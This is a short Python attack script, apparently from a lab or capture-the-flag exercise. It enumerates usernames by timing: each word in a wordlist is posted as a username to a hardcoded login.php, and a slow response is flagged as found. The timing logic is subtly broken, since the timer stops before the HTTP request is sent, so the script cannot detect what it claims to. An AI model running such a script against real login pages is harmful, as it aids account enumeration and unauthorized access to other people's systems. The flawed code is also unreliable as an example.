import sys
import timeit
import requests
 
if sys.argv[1] == '':
    sys.exit(0)

with open(sys.argv[1],'r') as file:   
    for line in file:
        for word in line.split():
            time_start = timeit.default_timer()
            data = {'username': word, 'password': 'password'}
            time = timeit.default_timer() - time_start
            r = requests.post('http://172.15.23.53:8080/login.php', data=data)
            print('[+] Username: {} - Response Time: {:.8f}'.format(word,time))
            if time > 5 and word != 'guest':
                print('[+] Found')
                sys.exit(0)
